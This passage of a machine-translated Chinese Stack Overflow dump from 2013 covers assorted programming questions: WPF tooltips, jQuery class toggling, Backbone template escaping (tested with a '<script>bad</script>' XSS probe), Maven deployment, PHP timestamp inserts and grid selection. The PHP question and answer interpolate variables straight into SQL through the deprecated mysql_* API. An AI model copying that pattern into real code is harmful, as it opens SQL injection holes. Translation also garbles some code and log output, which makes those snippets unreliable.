我不知道为什么？请帮助我，我是甲骨文的新手

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:35:17.623

尝试`NEXTVAL`代替`NEXTAVL`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T19:35:26.587

这是一个错字，更改`NEXTAVL`为`NEXTVAL`。

# c# - 在 wpf 工具提示中使用 WindowsFormHost

> ID：15533022
> 
> 赞同：0
> 
> 时间：2013-03-20T19:34:24.560
> 
> 标签：c#, wpf, winforms, tooltip, windowsformshost

我正在尝试在`ToolTip`. 下面是 Xaml 代码和`ToolTip`.

问题是如果我使用 windowsFormsHost 面板不会改变颜色，感觉就像`ToolTip`不知道它在那里。

我做对了吗？

（如果我能够更改颜色，那么我将使用它来显示相机的 liveFeed）

当我点击按钮时，它就在`ToolTip`那里，但它仍然是基本的。

如果我没有 Windows 窗体主机并使用 a`StackPanel`那么它可以工作。但我需要使用`Panel`.

xml:

```
<Grid>
<Button Width="100" Height="100">
        <Button.ToolTip>
            <Controls:MyToolTip Height="500" Width="550">
                    <WindowsFormsHost x:Name="wrapper" Margin="0,0,0,0" Background="{x:Null}">
                        <wf:Panel x:Name="previewScreen" BackColor="Purple" Size="200,200" >
                        </wf:Panel>
                    </WindowsFormsHost>
            </Controls:MyToolTip>
        </Button.ToolTip>
  </Button>
  </Grid> 
```

C＃ ：

```
public class MyToolTip : ToolTip
{
    protected override void OnTemplateChanged(ControlTemplate oldTemplate, ControlTemplate newTemplate)
    {
        if (newTemplate != null)
        {
            this.Visibility = Visibility.Collapsed;
            this.IsOpen = true;
            Popup popup = GetPopupFromVisualChild(this);
            if (popup != null) popup.AllowsTransparency = false;
            this.IsOpen = false;
            this.Visibility = Visibility.Visible;
        }
    }

    private static Popup GetPopupFromVisualChild(Visual child)
    {
        Visual parent = child;
        FrameworkElement visualRoot = null;
        while (parent != null)
        {
            visualRoot = parent as FrameworkElement;
            parent = VisualTreeHelper.GetParent(parent) as Visual;
        }

        Popup popup = null;
        if (visualRoot != null)
        {
            popup = visualRoot.Parent as Popup;
        }

        return popup;
    }
} 
```

感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T03:19:37.370

问题是面板没有内容，所以它不显示背景。

尝试这个：

```
<Grid>
    <Button Width="100" Height="100">
        <Button.ToolTip>
            <Controls:MyToolTip >
                <WindowsFormsHost x:Name="wrapper" Margin="0,0,0,0" Background="{x:Null}" >
                    <wf:Panel x:Name="previewScreen" BackColor="Purple" Size="200,200" >
                        <wf:Panel.Controls>
                            <wf:Label Text="Test"></wf:Label>
                        </wf:Panel.Controls>                            
                    </wf:Panel>
                </WindowsFormsHost>
            </Controls:MyToolTip>
        </Button.ToolTip>
    </Button>
</Grid> 
```

# webkit - 访问.css 表中的waveform.png 以使用webkit-mask？

> ID：15533024
> 
> 赞同：1
> 
> 时间：2013-03-20T19:34:31.193
> 
> 标签：webkit, soundcloud, waveform

基于自定义播放器示例即时构建我自己的播放器。我使用了最小播放器模板。

在我按照自己的意愿设置播放器后，我开始自定义设计（color.css、structure.css、standard、css）

但现在我被严重卡住了。我发现除非我使用 webkit 或waveform.js，否则我无法更改波形的背景颜色。

webkit对我来说应该很好......

我唯一的问题是，我不知道如何在 index.html 或 *.css 文件中访问 track.waveform_url。

我知道它的内部波形容器 div，但我需要 url

```
 .wavekit{
    -webkit-mask-box-image: url(**IN HERE!!!**);
    background: #81D8D0;
    height: 280px;
    width: 100%;
    bottom: 0px;
    position: fixed;
  } 
```

在我的样式表里面..

遗憾的是我无法提供链接，因为它只在我的硬盘上

有人可以帮我吗？非常感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T16:12:19.850

好吧，这很hacky，但是经过几次尝试后，我还没有找到更好的方法来获取波形URL。

想法是，对于第一次播放，有一个`'ajaxSuccess'`正在触发的事件，对于下一个有`'scPlayer:onAudioReady'`事件。关键是该图像的 DOM 仅在某个时候由插件生成，因此我们需要某个“挂钩”（例如事件）来确定图像是否已经存在于 DOM 中。

```
$(document).bind('ajaxSuccess scPlayer:onAudioReady', function () {
    // get image from DOM of player 
    // it will be re-set every next play
    console.log($('.sc-waveform-container > img').attr('src'));
    $('.wavekit').style({
      '-webkit-mask-box-image': $('.sc-waveform-container > img').attr('src')
    });
}); 
```

这是工作示例[http://jsbin.com/uhodom/2/edit](http://jsbin.com/uhofom/2/edit)（仅在 Chrome 中测试）

自定义播放器项目已经过时，可能不会引起太多关注。从 JavaScript 的角度来看，它的当前状态不是很可扩展。

我的建议是使用[Audio5JS](http://zohararad.github.com/audio5js/)或[SoundManager2](http://www.schillmania.com/projects/soundmanager2/)之类的东西来播放音乐并拥有自定义 HTML 和 CSS UI。要获取实际的声音或设置数据，您可以查询我们的 HTTP API 或使用[SoundCloud JavaScript SDK](http://developers.soundcloud.com/docs/api/sdks#javascript)。然后，您将拥有包含所有数据（包括波形 API）的适当对象，并且可以更好地控制该过程。

# jquery - if 语句检查 div 的类

> ID：15533028
> 
> 赞同：0
> 
> 时间：2013-03-20T19:34:37.890
> 
> 标签：jquery

我想检查一个 div 的类并在单击时将其更改为另一个。

我的 if 语句一定有问题。

我会很感激。

```
$("#mapresize").click(function() {
    if (this.className == "mapexpand width100") {
        $("div", this).attr('class', 'mapcollapse width100');
        $("#checkin-gmap").animate({
            height: '500px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
        // $(".checkinmap-control").show("500");
    } else {
        $(this).attr('class', 'mapexpand width100');
        $("#checkin-gmap").animate({
            height: '250px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
        // $(".checkinmap-control").hide("500");
    }
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:36:02.007

你可以 在 jQuery中使用[hasClass](http://api.jquery.com/hasClass/)

```
if($('#mydiv').hasClass('mapexpand')){

  $("#checkin-gmap").animate({
        height: '500px'
    }, 500, function() {
        google.maps.event.trigger(map, "resize");
    });
 }else
{ .....
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:36:56.997

您的代码的问题是您使用了`class`JavaScript 中的保留字。

```
if ($("div", this).attr(class) == "mapexpand") 
```

您应该像这样使用字符串“class”：

```
if ($("div", this).attr('class') == "mapexpand") 
```

实际上，您可以完全摆脱该`if`声明。您可以使用该[`toggleClass`](http://api.jquery.com/toggleClass/)功能来切换课程。

也没有必要使用`hide()`以及`show()`何时可以使用[`toggle`](http://api.jquery.com/toggle/)（在注释行中）。

您可以使用`toggle`两个函数，因此无需检查类来决定执行哪个动画。

像那样：

```
$(".mapexpand").click(function() {
    $("div", this).toggleClass('mapexpand mapcollapse');

    $("#checkin-gmap").toggle(function() {
        $(this).animate({
            height: '500px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
    }, function() {
        $(this).animate({
            height: '250px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
    });
    // $(".checkinmap-control").toggle("500");
    return false;
}); 
```

PS 你永远不应该用`attr`. `class`想象一下属性中有几个类。您必须将它们分开并检查每个是否与您的匹配。查看[所有与类相关的 jQuery 方法](http://api.jquery.com/category/manipulation/class-attribute/)并使用它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:38:11.560

使用`hasClass`,`removeClass`和`addClass`...试试这个：

```
$(".mapexpand").click(function() {
    var j = $("div", this);
    var cls = 'mapexpand';
    if (!j.hasClass(cls)) {
        j.addClass(cls);
        $("#checkin-gmap").animate({
            height: '500px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
        // $(".checkinmap-control").show("500");
    } else {
        j.removeClass(cls);
        $("#checkin-gmap").animate({
            height: '250px'
        }, 500, function() {
            google.maps.event.trigger(map, "resize");
        });
        // $(".checkinmap-control").hide("500");
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T19:38:18.947

请尝试`hasClass`：

```
if ($("div", this).hasClass("mapexpand")) {
     ............ 
```

# python - 在 Python 中创建一个与目录同名的文件

> ID：15533034
> 
> 赞同：1
> 
> 时间：2013-03-20T19:34:44.363
> 
> 标签：python, macos, io, filesystems

我有一个目录`/project/my_name/`

我需要创建一个文件`/project/my_name`

但 ：

```
with open(filename, 'w') as outfile:
    outfile.write(my_content) 
```

增加`IOError: [Errno 21] Is a directory: u'/project/my_name'`

有什么帮助吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T19:36:14.297

从文件系统的角度来看，目录是一种文件。你不能有两个同名的文件。

# javascript - Backbone.js / Underscore.js：为什么我的模板没有转义

> ID：15533035
> 
> 赞同：2
> 
> 时间：2013-03-20T19:34:53.623
> 
> 标签：javascript, backbone.js, xss, underscore.js

使用最新的主干和下划线库 (1.0.0/1.4.4) 我无法弄清楚为什么我的模板没有像我预期的那样转义。这是一个简化版本：

```
M = Backbone.Model.extend({});
V = Backbone.View.extend({
    template: _.template("<%- attr %>"),
    render: function() {
        this.$el.html(this.template(this.model.attributes));
        return this;
    }
});
m = new M({attr: "<script>bad</script>"});
v = new V({model: m});
v.render();
console.log(v.el); 
```

结果是：

```
<div><script>bad</script></div> 
```

显然，这并没有逃脱。我已经验证了作为独立代码执行的模板可以正确转义：

```
T = _.template("<%- attr %>");
console.log(T({attr: "<script>bad</script>"})); 
```

产生预期的结果

```
&lt;script&gt;bad&lt;&#x2F;script&gt; 
```

因此，某处的内容没有转义。如果有人知道在哪里，或者更好的是如何防止它，我将不胜感激。

斯蒂芬

* * *

更新：

弄清楚了！尽管问题不在于控制台*本身*，但**mu**的回答确实为我指明了正确的方向。为了解释，我需要对上面的示例代码进行一些详细说明，以便它更准确地反映我的上下文。该上下文实际上不是控制台输出，而是单元测试。我想验证我的代码是否正确地防止了 XSS 攻击，所以我编写了单元测试（使用 mocha/sinon/chai/should）：

```
v.$el.text().should.equal(m.escape("attr")); 
```

该测试失败（出乎意料），而以下测试通过（我认为它不应该）：

```
v.$el.text().should.equal(m.get("attr")); 
```

罪魁祸首原来是`toString()`元素对象上的方法。该方法`console.log()`使用，对内容进行转义。`text()`jQuery 在函数中也（间接）使用了该方法。

我不确定这在所有浏览器中是否通用，但在我的情况下，使用`.innerHTML()`可以避免`toString()`转义。所以写我的测试的正确方法是

```
v.el.innerHTML().should.equal(m.escape("attr")); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:25:40.820

我认为您的控制台过于“有用”并使您感到困惑。如果我们仔细观察，我们会确切地看到这里有什么样的诡计；我将切换到`<b>`而不是`<script>`避免将其分解`<script>`成碎片以避免混淆 jsfiddle。

考虑一下：

```
M = Backbone.Model.extend({});
V = Backbone.View.extend({
    template: _.template("<%- attr %>"),
    render: function() {
        this.$el.html(this.template(this.model.attributes));
        return this;
    }
});
m = new M({attr: "<b>bad</b>"});
v = new V({model: m});
v.render();

$('body').append(v.el);
$('body').append($(v.el).text()).append('<br>');
$('body').append($(v.el).html()); 
```

您将在页面上看到三件事：

1.  一个字面量`<b>bad</b>`。
2.  A`bad`粗体。
3.  一个字面量`<b>bad</b>`。

这正是我们期望看到的`attr`值**是否**被转义。

但是，您正在查看控制台。所以让我们也看看控制台，并在上面的 JavaScript 底部扔了几件事：

```
console.log(v.el);
console.log(v.el.innerHTML); 
```

现在在控制台中我们看到：

```
<div><b>bad</b></div>
&lt;b&gt;bad&lt;/b&gt; 
```

但是仔细看第一行，你应该看到`<div>`and`</div>`出现在紫色（或者你的控制台用于 DOM 元素的任何高亮颜色），而`<b>bad</b>`是黑色的（或者你的控制台用于纯文本的任何颜色）。因此，`attr`正在正确转义，但您的控制台在显示之前正在解码内容。

演示：http: [//jsfiddle.net/ambiguous/5nYTd/](http://jsfiddle.net/ambiguous/5nYTd/)

# maven - Maven - 动态 pom 文件？

> ID：15533055
> 
> 赞同：0
> 
> 时间：2013-03-20T19:35:55.743
> 
> 标签：maven, websphere, websphere-7

我正在使用 Maven 插件[was6-maven-plugin](http://mojo.codehaus.org/was6-maven-plugin)部署到 websphere。安装应用程序时，如果我正在安装新应用程序并且正在更新现有应用程序，则应该有一个名为[“updateExisting”](http://mojo.codehaus.org/was6-maven-plugin/installApp-mojo.html#updateExisting)的配置值。如果我正在全新安装/更新应用程序，我不喜欢手动切换此值。`false``true`

在我看来，我可以添加一个`uninstallApp`目标，即在安装应用程序之前始终卸载它，但这似乎是一种相当愚蠢的做法。

我注意到这个插件还有一个目标`wsListApps`是输出安装在服务器上的所有应用程序。输出如下所示：

```
[INFO] [wsadmin] WASX7209I：使用 SOAP 连接器连接到节点 1234Node02 上的进程“server1”；进程的类型是：UnManagedProcess
[信息] [wsadmin] 默认应用程序
[信息] [wsadmin] IBMUTC
[信息] [wsadmin] MyApplicationEAR
[信息] [wsadmin] ivtApp
[INFO] [wsadmin] 查询

```

Maven 是否可以扫描此输出中的字符串“MyApplicationEAR”并将“updateExisting”设置为“true”（如果找到），否则将其保留为“false”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:39:18.393

您需要的是能够在生命周期中更新 maven 属性，在阶段与您的`was6-maven-plugin`. （并使用此属性作为 的值`<updateExisting>`）

不幸的是，maven 属性是静态的，不能在运行时更改。所以乍一看这是不可能的。

但是，有一个插件：[properties-maven-plugin](http://evgeny-goldin.com/wiki/Properties-maven-plugin)可以用来在运行时定义新的属性。属性的值可以由 groovy 脚本定义。现在的问题更多是关于如何编写一个 groovy 脚本来告诉您的应用程序是否已经存在。

老实说，我不知道使用它是否是个好主意。我认为每次将[failOnError](http://mojo.codehaus.org/was6-maven-plugin/wsUninstallApp-mojo.html#failOnError)设置为 false 时运行卸载目标可能是最简单的方法（因此可能是最好的，但也许我遗漏了什么？）

# javascript - 在 javasctipt 中保存 ajax 调用之间的状态

> ID：15533057
> 
> 赞同：0
> 
> 时间：2013-03-20T19:36:01.933
> 
> 标签：javascript, jquery, ajax, local-storage

我想实现“缓存”以使用`localStorage`. request ( `requestData`) 的参数将是唯一标识符。这是我的代码：

```
App = {};
App.Service = function(name) {
    this.name = name;
};
App.Service.prototype.sendRequest = function(requestData) {
    // process request data somehow and store to local variable
    var identifier = $.param(requestData);

    $.ajax({
        url: 'web/api',
        success: function(data) {
            // can identifier differ from calculated before ajax call?
            // for example if someone else start this method in the same time?
            localStorage.setItem(identifier, data);
        },
        error: function(jqXHR, textStatus, errorThrown) {
            // handle error
        },
        type: "POST",
        data: requestData
    });
}; 
```

这是我的问题：假设我已经多次启动了 sendRequest 方法。每个`success`回调方法是自己操作`identifier`还是混合在一起（换句话说，错误的标识符将分配给响应数据）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:01:37.190

您是否考虑过简单地创建一个数组，将其称为类似`var cache = []`的名称，然后在每次检索后将响应数据添加到其中？只需使用一些变量来跟踪您使用的最后一个索引，或者如果您想跟踪请求的发出时间，请使用日期/时间，与任何响应数据分开。

# php - 获取当前时间/日期的时间戳

> ID：15533060
> 
> 赞同：5
> 
> 时间：2013-03-20T19:36:09.307
> 
> 标签：php, datetime, timestamp

我需要使用 PHP 的简单代码来使用 TIMESTAMP 获取当前日期/时间并将其插入数据库。

我在数据库中有一个名为“ArrivalTime”的字段作为 TIMESTAMP。

编辑：

```
<?php
$con = mysql_connect("localhost","root","") or die('Could not connect: ' . mysql_error());
mysql_select_db("a&e", $con) or die('Could not select database.'); 
```

// 证实

```
$time = time(); $date = date('Y-m-d H:i:s',$time);

$sql="INSERT INTO Patient(Forename, Surname, Gender, Date_Of_Birth, Address,    Patient_History, Illness, Priority, Arrival_Time)
VALUES('$patient_name', '$patient_lastname', '$gender', '$date', '$address', '$history', '$illness', '$priority', '$time')";
mysql_query($sql,$con) or die('Error: ' . mysql_error());

echo "1 record added";
// close connection 
mysql_close($con);
?> 
```

非常感谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T19:40:25.740

**主文件**

```
<?php
    require('connect.php');

    $time = time();

    $sql = "INSERT INTO yourtablename (ArrivalTime) Values ('$time')";
    mysql_query($sql);

    ?> 
```

PS：在sql语句中，我确定您需要将其他内容放在其他字段中，因此您只需将上面的内容替换为：

```
$sql = "INSERT INTO yourtablename (field1, field2, ArrivalTime) Values ('$value1','$value2','$time')"; 
```

**连接.php**

```
<?php

$error = "Couldn't connect";
$connect = mysql_connect("localhost","username","password") or die($error);
mysql_select_db("yourdatabase") or die($error);

?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T19:45:30.187

查询将是：

```
 INSERT INTO mytable(ArrivalTime) VALUES(UNIX_TIMESTAMP()) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:02:50.853

mysql 有一个函数[UNIX_TIMESTAMP()](http://dev.mysql.com/doc/refman/5.7/en/date-and-time-functions.html#function_unix-timestamp)用于将 Unix 时间戳作为无符号整数。

例子：

mysql> 选择 UNIX_TIMESTAMP(); -> 1196440210

所以你可以使用这个 sql 查询：

插入表名（到达时间）值（UNIX_TIMESTAMP（））

# html - facebook“like”按钮与“tweet”和“pin”按钮错位

> ID：15533062
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:36:12.527
> 
> 标签：html, css, facebook, twitter, pinterest

我不擅长代码，所以如果有人能给我一个简单明了的答案，我将不胜感激！因为这是一个令人讨厌的问题。

提前谢谢你杰克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:39:54.597

我有同样的问题，这是我的解决方案：

将您的社交按钮放入这样的列表中：

```
<ul>
    <li>Facebook code</li>
    <li>Twitter code</li>
    <li>Pinterest code</li>
</ul> 
```

在 css 中，为 li 添加样式：

```
li{
    list-style-type: none;
    display: inline-block;
    vertical-align: top;
} 
```

与顶部垂直对齐，所有按钮都将对齐。

# jquery - Jquery "scrollTop" & "height" .click 延迟问题

> ID：15533065
> 
> 赞同：0
> 
> 时间：2013-03-20T19:36:17.840
> 
> 标签：jquery, html, jquery-animate, height, scrolltop

我的代码有几个小问题。我已经编写了一个 JQUERY 序列，您可以在其中单击“注册”，然后向下滚动到表单显示的位置。现在我在底部有一个按钮，该功能关闭表单并将您滚动回顶部。

**该示例可以在这里看到：http: [//www.icecable.com/sandbox/priority%5Fsign%5Fup/test.html](http://www.icecable.com/sandbox/priority%5Fsign%5Fup/test.html)**

单击“立即注册”，动画可以正常工作。单击“关闭并返回顶部”，动画再次正常工作。***问题出现在这之后。***

如果您尝试单击任一“立即注册”按钮，“高度”动画会正常开始，但“scrollTop”动画会出现很大延迟，原因不明。

**这是我的代码**

```
$(document).ready(function() {

$('.dealer').click(function(e) {
    e.preventDefault();
    $('html, body').animate({
        scrollTop: '860'
    }, 1800, "easeInOutQuint");
});

$('.top').click(function(e) {
    e.preventDefault();
    $('html, body').animate({
        scrollTop: '0px'
    }, 1500, "easeInOutQuint");
});

$('.dealer').click(function(e) {
    e.preventDefault();
  $('#priority').animate({
    height: 'show'
    }, 1200,  "easeInOutCirc");
});

$('.top').click(function(e) {
    e.preventDefault();
  $('#priority')
    .animate({
        height: 'hide'
        }, 590, "easeInQuint");

});

//Form for Distributors

$('.distributor').click(function(e) {
    e.preventDefault();
    $('html, body').animate({
        scrollTop: '860'
    }, 1800, "easeInOutQuint");
});

$('.top').click(function(e) {
    e.preventDefault();
    $('html, body').animate({
        scrollTop: '0px'
    }, 1500, "easeInOutQuint");
});

$('.distributor').click(function(e) {
    e.preventDefault();
  $('#distributor').animate({
    height: 'show'
    }, 1200,  "easeInOutCirc");
});

$('.top').click(function(e) {
    e.preventDefault();
  $('#distributor')
    .animate({
        height: 'hide'
        }, 590, "easeInQuint");

    });
}); 
```

有什么我做错了吗？表格再次隐藏后有没有办法重置事件？任何帮助/见解/资源将不胜感激！

将要

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:07:33.793

没有小提琴，我不能肯定地说，但我建议你使用一些`console.log`调用来打印出开始和结束`scrollTop`值。我以前遇到过一些类似的问题，它们通常是由于滚动错误金额和恢复到错误金额的问题。

您可能没有注意到的可能情况是，当您向上滚动时，您的`scrollTop`值会超出`0`某个负数。窗口不能滚动到负数`scrollTop`，因此它必须“等待”直到值返回，`0`然后才能开始可见动画。

注意：即使您已将 设置`scrollTop`为零，也有可能发生这种情况，因为这可能不是它的初始位置。当我说“负数”时，我的意思是“相对于初始位置的负数”。

**更新：**看看[这个页面](http://firebreaksice.com/smooth-scrolling-links-to-the-top-of-the-page/)。它还链接到[相应的 SO 帖子](https://stackoverflow.com/questions/1890995/1891142#1891142)，并告诉您如何平滑滚动到顶部。我以前使用过代码的修改版本，虽然它与您所拥有的非常相似，但 SO 帖子可能会给您一些额外的见解。

我还将您的`animate`函数更改为仅调用`"html"`元素，而不是`"html"`元素和`"body"`元素。

# xcode - 使用从 UIImagePickerController 获取的图像在 UITabBarController 中推文的 iOS6 问题

> ID：15533066
> 
> 赞同：1
> 
> 时间：2013-03-20T19:36:18.017
> 
> 标签：xcode, ios6, tweets

从 UIImagePickerController 选择图像后，我想发推但有错误！

```
Warning: Attempt to present <SLTwitterComposeViewController: 0x210d84b0> on <UITabBarController: 0x1fd67650> while a presentation is in progress! 
```

PS这是标签栏应用程序（4个标签栏）

所有代码：

```
 -(void)useCamera:(id)sender
{
    if ([UIImagePickerController isSourceTypeAvailable:UIImagePickerControllerSourceTypeCamera]){
        UIImagePickerController *imagePicker =[[UIImagePickerController alloc] init];
        imagePicker.delegate = self;
        imagePicker.sourceType = UIImagePickerControllerSourceTypeCamera;
        imagePicker.mediaTypes = @[(NSString *) kUTTypeImage];
        imagePicker.allowsEditing = NO;
        [self presentViewController:imagePicker animated:YES completion:nil];
        _newMedia = YES;
    }
}

-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info{
    NSString *mediaType = info[UIImagePickerControllerMediaType];
    [self dismissViewControllerAnimated:YES completion:nil];

    if ([mediaType isEqualToString:(NSString *)kUTTypeImage]) {
        [self buttonTweet:info[UIImagePickerControllerOriginalImage]];
    }
}

- (IBAction)buttonTweet:(id)sender {

    SLComposeViewController *composeController = [SLComposeViewController composeViewControllerForServiceType:SLServiceTypeTwitter];

    [composeController setInitialText:[NSString stringWithFormat:@"#this is tweet text"]];
    [composeController addImage:sender];
    [composeController addURL: [NSURL URLWithString:@"http://www.abc.com"]];
    [self presentViewController:composeController animated:YES completion:nil];
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:51:12.310

您正在展示一个新的视图控制器，而旧的视图控制器仍在消失。您可以像这样在完成另一个动画后呈现新动画：

```
[self dismissViewControllerAnimated:YES completion:^{
    if ([mediaType isEqualToString:(NSString *)kUTTypeImage]) {
        [self buttonTweet:info[UIImagePickerControllerOriginalImage]];
    }
}]; 
```

# javascript - 如何在不使用循环的情况下在 javascript 选取框内查找选定元素？

> ID：15533067
> 
> 赞同：5
> 
> 时间：2013-03-20T19:36:19.743
> 
> 标签：javascript

我正在编写自己的拖放文件管理器。这包括一个 javascript 选取框，当它处于活动状态时计算相交的元素（文件）并通过向它们添加类来选择它们。

我目前在 mousemove 处理程序期间执行检查，循环遍历元素坐标数组并确定哪些坐标与拖放选择框相交。

该函数当前如下所示：

```
selectItems : function(voidindex){

                        var self = this;
                        var coords = self.cache.selectioncoords;

    for(var i=0, len = self.cache.items.length; i<len; i++){
           var item = self.cache.items[i];
           var itemcoords = item.box_pos;

           if(coords.topleft.x < (itemcoords.x+201) && coords.topright.x > itemcoords.x && coords.topleft.y < (itemcoords.y+221) && coords.bottomleft.y > itemcoords.y){
               if(!item.selected){
                  item.selected = true;
                  item.html.addClass('selected').removeClass('activebutton');
                  self.cache.selecteditems.push(i);
                  self.setInfo();
               }
           }
           else{
               if(item.selected){
                  item.selected = false;
                  if(!voidindex || voidindex !== i){
                      item.html.removeClass('selected');
                  }
                  var removeindex = self.cache.selecteditems.indexOf(i);
                  self.cache.selecteditems.splice(removeindex, 1);
                  self.setInfo();
           }
       }
  }
}, 
```

上面的代码中有很多脏逻辑，确保只有在选择更改时才操作 DOM。这与问题无关，可以排除。重要的部分是检查元素坐标与选取框坐标的交集逻辑。

另请注意，项目尺寸固定为**201px 宽 x 221px 高**。

我已经对此进行了测试，并且一切正常，但是我需要支持潜在的数千个文件，这意味着在某些时候我们将开始看到 UI 性能下降。

我想知道是否无论如何都可以在不遍历每个元素的坐标的情况下执行交叉点检测。

在任何给定时间，选取框的坐标定义如下：

```
 selectioncoords : {
                    topleft : {
                        x : 0,
                        y : 0
                    },
                    topright : {
                        x : 0,
                        y : 0
                    },
                    bottomleft : {
                        x : 0,
                        y : 0
                    },
                    bottomright : {
                        x : 0,
                        y : 0
                    },
                    width : 0,
                    height : 0
                } 
```

存储在 self.cache.items 数组中的每个项目的坐标定义如下：

```
item : {
       box_pos : {
             x : 0,
             y : 0
       },
       grid_pos : {
              row : 1,
              column : 1
       }

    } 
```

因此，可用的信息将始终是实际网格位置（行/列）以及物理项目位置（网格内以像素为单位的左侧和顶部偏移量）。

总而言之，问题是，是否无论如何都可以从上面定义的一组选取框坐标中检测项目交集，而无需在每次触发 mousemove 事件时循环遍历整个项目坐标数组？

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T21:06:14.357

以下内容取决于具有所述尺寸的锁定网格。

您正在将鼠标定义的矩形与具有静态边缘尺寸的网格进行比较。因此，给定 x 坐标或 ay 坐标，您应该能够很容易地得出坐标落入哪一列或哪一行（分别）。

当用户启动选择框时，抓住 x 和 y，然后找到开始的行/列。当鼠标在拉动选择框的同时移动时，您会找到（然后更新）完成的行/列。选择该框定义的行和该框（包括）定义的列中的任何内容。如果您随后根据行和列将可选元素保留在二维数组中，您应该能够以这种方式获取您想要的元素。

请注意，这有多少效率更高（或更低）取决于您预期的选择框与总尺寸相比的大小，以及您希望填充网格的程度。当然，如果平均用例是一次选择一半左右的对象，那么您无法有效减少每次必须查看的对象数量。

此外，虽然它很笨拙，但您可以让 mousemove 处理程序不会每次都触发。让它在更新之间暂停一点会大大降低这个特定功能的响应能力，但会显着减少使用的资源量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T21:10:12.233

您可以通过为网格中的每个项目编制索引来限制检查的范围，根据*需要*经常而*不是更频繁*。您可以使用网格为您提供X、Y 坐标*附近或**可能*在 X1、Y2、X1、Y2 范围内的元素列表。

为了让你开始...

```
var Grid = function(pixelWidth, pixelHeight, boxSize) {

  this.cellsIn = function(x1, y1, x2, y2) {
    var rv = [];
    for (var x = x1; x < x2; x += boxSize) {
      for (var y = y1; y < y2; y += boxSize) {
        var gx = Math.ceil(x/boxSize);
        var gy = Math.ceil(y/boxSize);
        rv.push(this.cells[gx][gy]);
      }
    }
    return rv;
  } // cellsIn()

  this.add = function(x1, y1, x2, y2, o) {
    var cells = this.cellsIn(x1, y1, x2, y2);
    for (var i in cells) {
      cells[i].push(o);
    }
  } // add()

  this.get = function(x1, y1, x2, y2) {
    var rv = [];
    var rv_index = {};
    var cells = this.cellsIn(x1, y1, x2, y2);
    for (var i in cells) {
      var cell = cells[i];
      for (var oi in cell) {
        if (!rv_index[cell[oi]]) {
          rv_index[cell[oi]] = 1;
          rv.push(cell[oi]);
        }
      }
    }
    return rv;
  } // get()

  this.cells = [];
  for (var x = 0; x < Math.ceil(pixelWidth/boxSize); x++) {
    this.cells[x] = [];
    for (var y = 0; y < Math.ceil(pixelHeight/boxSize); y++) {
      this.cells[x][y] = [];
    }
  }

}; 
```

因此，不是遍历所有可能的对象，*无论*它们是什么，而是遍历给定坐标附近或*可能*位于给定坐标中的所有对象。

这要求您在项目坐标更改时维护/重新索引网格。您可能希望向上述（或类似的）Grid 类添加一些功能来修改/移动现有对象。但是，据我所知，这种索引是在“空间”中索引对象的最佳方式，即使不是唯一的方式。

**免责声明**：上面的代码未经测试。但是，我有类似的代码。在此处查看 DemoGrid 函数类：[http ://www.thepointless.com/js/ascii_monsters.js](http://www.thepointless.com/js/ascii_monsters.js)

我的 DemoGrid 的功能是相似的（据我记得，已经有一段时间了），但接受`x, y, radius`作为参数。同样值得注意的是，每次事件触发时，我的鼠标事件都不会触及网格。检查受游戏/主循环的速率限制。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-27T21:15:11.653

有几种方法可以解决这个问题。这是一个。首先，您需要某种组织结构中的项目，您可以按行和列快速查找。您可以使用二维数组，或者为简单起见，我将使用哈希表。您可以在创建 的同时`self.cache.items`或稍后执行此操作，如下所示：

```
var cacheLookup = {};

function initCacheLookup() {
    var items = self.cache.items;
    for( var i = 0, n = items.length;  i < n;  i++ ) {
        var item = items[i];
        var key = [ item.grid_pos.row, item.grid_pos.column ].join(',');
        cacheLookup[key] = item;
    }
} 
```

然后，当您想要获取与矩形相交的项目时，您可以执行以下操作：

```
var itemWidth = 201, itemHeight = 221;

var tl = selectioncoords.topleft, br = selectioncoords.bottomright;
var left = Math.floor( tl.x / itemWidth ) + 1;
var right = Math.floor( br.x / itemWidth ) + 1;
var top = Math.floor( tl.y / itemHeight ) + 1;
var bottom = Math.floor( br.y / itemHeight ) + 1;

var selecteditems = [];
for( var row = top;  row <= bottom;  row++ ) {
    for( var col = left;  col <= right;  col++ ) {
        var key = [ row, col ].join(',');
        var item = cacheLookup[key];
        if( item ) {
            selecteditems.push( item );
        }
    }
}
// Now selecteditems has the items intersecting the rectangle 
```

这里可能有一两个错误，但这应该很接近。

好吧，正如我所说，这是一种方法。它有一个可能有趣的属性，即它不依赖于`self.cache.items`数组中项目的顺序。但是那个`cacheLookup`哈希表听起来可能不是最有效的解决方案。

